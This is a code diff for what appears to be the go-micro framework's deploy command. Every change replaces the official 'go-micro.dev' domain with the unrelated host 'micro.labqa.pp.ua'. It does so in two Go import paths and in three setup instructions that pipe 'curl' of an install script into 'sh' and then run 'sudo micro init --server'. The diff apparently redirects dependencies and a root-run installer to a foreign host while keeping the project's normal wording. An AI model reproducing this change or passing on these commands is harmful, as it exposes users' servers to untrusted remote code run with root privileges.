@@ -11,8 +11,8 @@ import (
 	"time"
 
 	"github.com/urfave/cli/v2"
-	"go-micro.dev/v5/cmd"
-	"go-micro.dev/v5/cmd/micro/run/config"
+	"micro.labqa.pp.ua/v5/cmd"
+	"micro.labqa.pp.ua/v5/cmd/micro/run/config"
 )
 
 const (
@@ -59,7 +59,7 @@ To deploy, you need a server running micro. Quick setup:
 
   1. On your server (Ubuntu/Debian):
      ssh user@your-server
-     curl -fsSL https://go-micro.dev/install.sh | sh
+     curl -fsSL https://micro.labqa.pp.ua/install.sh | sh
      sudo micro init --server
 
   2. Then deploy from here:
@@ -256,7 +256,7 @@ func checkServerInit(host, remotePath string) error {
 
   Run this on the server:
     ssh %s
-    curl -fsSL https://go-micro.dev/install.sh | sh
+    curl -fsSL https://micro.labqa.pp.ua/install.sh | sh
     sudo micro init --server
 
   Or initialize remotely (requires sudo):
@@ -439,7 +439,7 @@ func init() {
 		Description: `Deploy copies binaries to a remote server and manages them with systemd.
 
 Before deploying, initialize the server:
-  ssh user@server 'curl -fsSL https://go-micro.dev/install.sh | sh && sudo micro init --server'
+  ssh user@server 'curl -fsSL https://micro.labqa.pp.ua/install.sh | sh && sudo micro init --server'
 
 Then deploy:
   micro deploy user@server
